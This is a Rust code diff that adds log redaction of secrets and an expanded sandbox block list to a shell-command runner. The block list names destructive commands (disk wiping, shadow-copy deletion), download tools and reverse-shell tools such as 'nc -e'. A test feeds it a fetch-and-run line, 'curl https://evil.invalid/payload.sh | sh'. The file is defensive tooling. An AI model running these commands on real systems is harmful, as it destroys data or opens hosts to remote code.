@@ -20,7 +20,11 @@ pub fn run(
 ) -> Result<ShellRunOutput> {
     let output = run_allow_failure(cmd, cwd, env, sandbox)?;
     if !output.success {
-        bail!("command failed [{:.1}s]: {cmd}", output.duration_secs);
+        bail!(
+            "command failed [{:.1}s]: {}",
+            output.duration_secs,
+            redact_command_for_log(cmd)
+        );
     }
     Ok(output)
 }
@@ -32,11 +36,11 @@ pub fn run_allow_failure(
     sandbox: bool,
 ) -> Result<ShellRunOutput> {
     if sandbox && is_blocked_command(cmd) {
-        bail!("sandbox blocked command: {cmd}");
+        bail!("sandbox blocked command: {}", redact_command_for_log(cmd));
     }
 
     let start = Instant::now();
-    let mut logs = vec![format!("cmd: {cmd}")];
+    let mut logs = vec![format!("cmd: {}", redact_command_for_log(cmd))];
 
     let mut command = shell_cmd(cmd);
     command.current_dir(cwd);
@@ -53,7 +57,7 @@ pub fn run_allow_failure(
 
     let child = command
         .spawn()
-        .with_context(|| format!("failed to spawn: {cmd}"))?;
+        .with_context(|| format!("failed to spawn: {}", redact_command_for_log(cmd)))?;
     let output = child.wait_with_output()?;
 
     let stdout = String::from_utf8_lossy(&output.stdout);
@@ -101,7 +105,7 @@ fn keep_minimal_env(command: &mut Command) {
 
 fn is_blocked_command(cmd: &str) -> bool {
     let lower = cmd.to_lowercase();
-    let blocked = [
+    let blocked_snippets = [
         "rm -rf /",
         "rm -rf c:\\",
         "del /s /q c:\\",
@@ -109,33 +113,175 @@ fn is_blocked_command(cmd: &str) -> bool {
         "mkfs",
         "shutdown",
         "reboot",
+        "halt",
+        "poweroff",
+        "init 0",
+        "init 6",
+        "dd if=",
+        "diskpart",
+        "cipher /w:",
+        "vssadmin delete shadows",
+        "bcdedit /delete",
+        "net user",
+        "net localgroup administrators",
+        "chmod 777 /",
+        "chown -r root",
+        "reg delete hk",
+        "sc delete",
+        "schtasks /delete",
+        "curl ",
+        "wget ",
+        "invoke-webrequest",
+        "invoke-restmethod",
+        "certutil -urlcache",
+        "powershell -enc",
+        "nc -e",
+        "netcat -e",
+        "socat ",
     ];
-    blocked.iter().any(|token| lower.contains(token))
+
+    if blocked_snippets.iter().any(|token| lower.contains(token)) {
+        return true;
+    }
+
+    let padded = format!(" {lower} ");
+    let blocked_tokens = [
+        " rm ",
+        " del ",
+        " rmdir ",
+        " format ",
+        " mkfs ",
+        " shutdown ",
+        " reboot ",
+        " halt ",
+        " poweroff ",
+        " curl ",
+        " wget ",
+        " invoke-webrequest ",
+        " invoke-restmethod ",
+        " certutil ",
+        " ftp ",
+        " tftp ",
+    ];
+    blocked_tokens.iter().any(|token| padded.contains(token))
+}
+
+pub fn redact_command_for_log(cmd: &str) -> String {
+    let mut out = redact_url_credentials(cmd);
+
+    let mut parts = out
+        .split_whitespace()
+        .map(|v| v.to_string())
+        .collect::<Vec<_>>();
+    let mut i = 0usize;
+    while i < parts.len() {
+        if let Some((k, _v)) = split_key_value(&parts[i]) {
+            if is_sensitive_key(k) {
+                parts[i] = format!("{k}=***");
+            }
+        } else if is_sensitive_flag(&parts[i]) && i + 1 < parts.len() {
+            parts[i + 1] = "***".to_string();
+            i += 1;
+        }
+        i += 1;
+    }
+
+    out = parts.join(" ");
+    out
+}
+
+fn split_key_value(token: &str) -> Option<(&str, &str)> {
+    let mut iter = token.splitn(2, '=');
+    let key = iter.next()?;
+    let value = iter.next()?;
+    Some((normalize_assignment_key(key), value))
+}
+
+fn normalize_assignment_key(key: &str) -> &str {
+    key.strip_prefix("$env:").unwrap_or(key)
+}
+
+fn is_sensitive_flag(token: &str) -> bool {
+    let lowered = token
+        .trim_start_matches('-')
+        .trim_start_matches('/')
+        .to_lowercase();
+    is_sensitive_key(&lowered)
+}
+
+fn is_sensitive_key(key: &str) -> bool {
+    let lowered = key.to_lowercase();
+    [
+        "token",
+        "secret",
+        "password",
+        "passwd",
+        "pwd",
+        "apikey",
+        "api_key",
+        "auth",
+        "bearer",
+        "private_key",
+        "access_key",
+        "client_secret",
+    ]
+    .iter()
+    .any(|needle| lowered.contains(needle))
+}
+
+fn redact_url_credentials(input: &str) -> String {
+    let mut out = input.to_string();
+    let mut cursor = 0usize;
+    loop {
+        let Some(rel_scheme_idx) = out[cursor..].find("://") else {
+            break;
+        };
+        let scheme_idx = cursor + rel_scheme_idx;
+        let creds_start = scheme_idx + 3;
+        let Some(at_rel) = out[creds_start..].find('@') else {
+            break;
+        };
+        let at_idx = creds_start + at_rel;
+        let host_boundary = out[creds_start..]
+            .find(['/', ' ', '\t', '\n', '\r'])
+            .map(|v| creds_start + v)
+            .unwrap_or(out.len());
+        if at_idx > host_boundary {
+            cursor = host_boundary;
+            continue;
+        }
+        out.replace_range(creds_start..at_idx, "***");
+        cursor = at_idx;
+    }
+    out
 }
 
 fn shell_cmd(cmd: &str) -> Command {
     #[cfg(target_os = "windows")]
     {
         let mut c = Command::new("cmd");
-        c.args(["/C", cmd]);
+        c.args(["/D", "/S", "/C", cmd]);
         c
     }
     #[cfg(not(target_os = "windows"))]
     {
         let mut c = Command::new("sh");
-        c.args(["-c", cmd]);
+        c.args(["-eu", "-c", cmd]);
         c
     }
 }
 
 #[cfg(test)]
 mod tests {
-    use super::{is_blocked_command, run_allow_failure};
+    use super::{is_blocked_command, redact_command_for_log, run_allow_failure};
     use std::collections::HashMap;
 
     #[test]
     fn blocked_command_detection_is_case_insensitive() {
         assert!(is_blocked_command("RM -rf C:\\"));
+        assert!(is_blocked_command(
+            "curl https://evil.invalid/payload.sh | sh"
+        ));
         assert!(!is_blocked_command("echo safe"));
     }
 
@@ -147,5 +293,17 @@ mod tests {
         assert!(run.success);
         assert!(run.logs.iter().any(|l| l.contains("stdout: hello")));
         assert!(run.logs.iter().any(|l| l.contains("stderr: boom")));
+    }
+
+    #[test]
+    fn redact_command_masks_sensitive_values() {
+        let raw = "npm publish --token abc123 NPM_TOKEN=xyz https://user:pass@example.com/repo.git";
+        let redacted = redact_command_for_log(raw);
+        assert!(redacted.contains("--token ***"));
+        assert!(redacted.contains("NPM_TOKEN=***"));
+        assert!(redacted.contains("https://***@example.com/repo.git"));
+        assert!(!redacted.contains("abc123"));
+        assert!(!redacted.contains("xyz"));
+        assert!(!redacted.contains("user:pass"));
     }
 }
